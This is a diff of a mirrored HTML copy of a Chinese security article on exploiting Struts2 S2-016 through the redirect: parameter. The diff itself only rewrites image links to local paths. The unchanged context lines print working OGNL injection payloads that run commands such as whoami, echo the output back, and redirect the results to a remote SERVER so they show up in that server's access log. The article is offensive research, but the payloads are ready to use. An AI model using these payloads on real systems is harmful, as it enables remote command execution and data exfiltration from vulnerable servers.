@@ -3,7 +3,7 @@
 			<head>
 			     <title>Bool型SSRF的思考与实践 - Wulala</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/web/7550">http://drops.wooyun.org/web/7550</a></h1>
 				
@@ -81,40 +81,40 @@ Payload Result: 返回相应Payload的执行信息
 
 <p>通过对连个POC的理解, 我们知道下面的POC中的redirect是实现URL跳转,通过URL跳转来验证S2-016漏洞.</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092399440.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092399440.png" alt="enter image description here"></p>
 
 <p>当然也可以通过“<code>?redirect:http://www.baidu.com</code>”来验证. 那么我们是否可以通过”<code>?redirect:http://SERVER/%25{3*4}</code>” 将%25{3*4}的执行结果作为SERVER的URL的一部分发送到远端服务器, 通过实验我们证实了这样的想法.</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092385772.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092385772.png" alt="enter image description here"></p>
 
 <p>下面我们尝试S2-016的命令执行POC,执行结果如下:</p>
 
 <pre><code>?redirect:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092390336.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092390336.png" alt="enter image description here"></p>
 
 <p>特此说明一下,这里返回<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4b212a3d2a65272a252c651b3924282e383802263b270b333333333333">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>表示命令执行成功, 将命令执行的结果通过redirect跳转输出到远程服务器.</p>
 
 <pre><code>?redirect:http//SERVER/%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start()}
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092378081.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092378081.png" alt="enter image description here"></p>
 
 <p>由服务器端Access日志可以看出,命令执行成功</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092386339.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092386339.png" alt="enter image description here"></p>
 
 <p>其实通过上面的这种方式,我们已经完全能够准确的判断Payload Result的执行状态, 但是这不是我要的, 我想要Payload Result执行结果. 带回显的POC:</p>
 
 <pre><code>?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092550624.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092550624.png" alt="enter image description here"></p>
 
 <p>将命令执行结果Redirect到远程:</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092539910.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092539910.png" alt="enter image description here"></p>
 
 <p>我们可以看到本地浏览器可以打印出结果,但是远程Access.log不会有任何日志. 对Java懂一点点的人都知道(比如我,对Java略懂一点点), 这里的POC的作用就是本地打印,所以肯定是不行的. 下一步我们就需要更改POC , 因为对Java不熟, 为此花费了大半天的时间,写下下面的POC:</p>
 
@@ -123,11 +123,11 @@ Payload Result: 返回相应Payload的执行信息
 
 <p>SERVER是我们的HTTP服务器IP地址, 我们获取命令执行结果,然后把他作为一个URL参数发送到远程SERVER上, 所以我们可以在远程SERVER的access.log看到命令的执行结果.</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092550173.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092550173.png" alt="enter image description here"></p>
 
 <p>远程服务器日志:</p>
 
-<p><img src="http://static.wooyun.org//drops/20150802/2015080206092548854.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015080206092548854.png" alt="enter image description here"></p>
 
 <p>至此, 我们完成了从一个BOOL型的SSRF转换为一个普通的SSRF,我们可以获取到任何Payload的执行结果, 我只能说这是一个质的飞跃.</p>
 
